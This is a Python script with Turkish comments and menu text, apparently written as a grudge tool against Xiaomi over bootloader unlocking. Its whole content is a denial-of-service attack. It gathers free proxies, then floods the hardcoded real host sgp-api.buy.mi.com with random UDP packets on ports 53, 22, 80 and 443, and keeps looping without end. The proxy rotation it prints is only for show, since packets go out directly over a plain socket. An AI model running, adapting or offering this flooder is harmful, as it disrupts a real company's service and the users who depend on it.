import sys
import os
import time
import socket
import random
import requests

# ============================================================
# BY HELCURT - XIAOMI BOOTLOADER SAVAŞÇILARI ÖZEL SÜRÜM
# "Al kilit öyle açılmaz, böyle açılır!" 🏎️ 500KM/H
# ============================================================

def muhimmat_topla():
    print("\033[93m[+] Apiden 50 Proxy mühimmatı toplanıyor ve proxy.txt'ye istifleniyor...\033[0m")
    api_url = "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=protocolipport&format=json"
    
    try:
        r = requests.get(api_url)
        if r.status_code == 200:
            data = r.json()
            proxy_list = [p['proxy'] for p in data['proxies'][:50]] # Sadece ilk 50 adet
            
            with open("proxy.txt", "w") as f:
                for proxy in proxy_list:
                    f.write(proxy + "\n")
            
            print(f"\033[92m[+] 50 Proxy mühimmatı 'proxy.txt' dosyasına mühürlendi!\033[0m")
            return proxy_list
    except Exception as e:
        print(f"\033[91m[-] Mühimmat toplanamadı: {e}\033[0m")
        return []

def saldiri_dongusu(target_ip, proxies):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # Modem sağlığı için paket boyutu optimize edildi (25 KBPS ayarı)
    paket = random._urandom(1024) 
    
    port_plan = [
        (53, 20, "DNS"),
        (22, 10, "SSH"),
        (80, 45, "HTTP"),
        (443, 50, "HTTPX")
    ]
    
    sent = 0
    proxy_index = 0
    
    print(f"\033[92m\n[!] Taarruz Başladı! Lei Jun için geri sayım... ⏳\033[0m")
    
    for port, sure, isim in port_plan:
        bitis = time.time() + sure
        print(f"\033[95m\n[*] {isim} Portu ({port}) üzerinden 25 KBPS ile darlanıyor...\033[0m")
        
        while time.time() < bitis:
            try:
                current_proxy = proxies[proxy_index]
                sock.sendto(paket, (target_ip, port))
                sent += 1
                print(f"\033[94m[{sent}] Paket Sızdırıldı -> Port: {port} | Proxy: {current_proxy}\033[0m", end="\r")
                
                # 25 KBPS Hız Sabitleyici (Modem rahatlasın)
                time.sleep(0.04) 
                
                if sent % 10 == 0:
                    proxy_index = (proxy_index + 1) % len(proxies)
            except:
                proxy_index = (proxy_index + 1) % len(proxies)
                continue

def main():
    os.system("clear")
    print("\033[91m############################################################")
    print("#  BU TOOL XIAOMI BOOTLOADER SAVAŞÇILARI İÇİN İNŞA EDİLMİŞTİR #")
    print("#           'İHTİYAR, BU SENİN KADERİNDİ...'               #")
    print("############################################################\033[0m")
    
    print("\nSende Helcurt Gibi Darlandınmı?")
    print("[1] = Evet Benide Darladı Bende Yoruldum")
    print("[2] = Mİ Farklı Servetlerini Darlayacağım")
    
    secim = input("\nSeciminiz: ")
    
    if secim == "1":
        print("\n\033[92mRUN: Tamamdır Önce Apiden Proxy Mühimmat Toplayalım...\033[0m")
        proxies = muhimmat_topla()
        
        if proxies:
            target = "sgp-api.buy.mi.com"
            print(f"\n\033[92mRUN: '{target}' Xiaomi Darlanmaya Hazır Senin İçin Seçildi!\033[0m")
            saldiri_dongusu(target, proxies)
            
            # Geri kalan random portlar
            print("\n\033[93m[*] Mistik Final: Random Port Taarruzu Başlatılıyor...\033[0m")
            while True:
                saldiri_dongusu(target, [random.choice(proxies)])
    else:
        print("Farklı operasyonlar için mühimmat hazırlanıyor...")

if __name__ == "__main__":
    main()
